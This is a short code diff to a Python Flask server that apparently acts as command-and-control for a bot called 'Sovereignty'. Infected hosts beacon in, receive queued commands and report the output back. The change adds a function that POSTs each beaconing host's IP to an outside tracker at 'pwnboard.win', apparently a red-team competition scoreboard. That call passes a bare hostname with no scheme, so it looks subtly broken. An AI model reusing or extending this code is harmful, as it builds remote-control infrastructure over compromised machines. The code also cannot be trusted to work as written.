@@ -66,6 +66,7 @@ Description: page bot beacons to for get commands
 @app.route('/beacon')
 def beacon():
 	ip = request.args.get('ip')
+	updatePwnboard(ip)
 	if ip not in bots:
 		bots[ip] = []
 		botsExe[ip] = []
@@ -93,6 +94,20 @@ def confirm():
 		bots[ip].remove(cmd)
 		botsExe[ip].append((cmd, output.strip()))
 	return 'True'
+
+def updatePwnboard(ip):
+    host = 'pwnboard.win'
+    msg = "Sovereignty received a beacon"
+    if not host:
+        return
+    data = {'ip': ip, 'application': "Sovereignty", 'message': msg}
+    try:
+        req = requests.post(host, json=data, timeout=3)
+        return True
+    except Exception as E:
+        print("Cannot update pwnboard: {}".format(E))
+        return False
+
 
 
 if __name__ == '__main__':
